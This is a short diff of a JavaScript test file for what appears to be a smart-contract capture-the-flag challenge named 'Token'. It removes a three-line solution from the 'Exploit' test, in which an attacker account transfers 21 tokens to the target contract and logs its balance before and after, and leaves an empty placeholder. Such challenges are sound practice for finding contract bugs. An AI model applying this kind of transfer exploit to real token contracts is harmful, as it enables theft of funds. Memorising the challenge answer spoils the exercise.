@@ -26,9 +26,7 @@ describe('[Challenge] Token', function () {
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        console.log(`\t balance before: ${await this.target.balanceOf(attacker.address)}`);
-        let transferTX = await this.target.connect(attacker).transfer(this.target.address, 21); await transferTX.wait();
-        console.log(`\t balance after : ${await this.target.balanceOf(attacker.address)}`);
+        
     }).timeout(0);
 
     after(async () => {
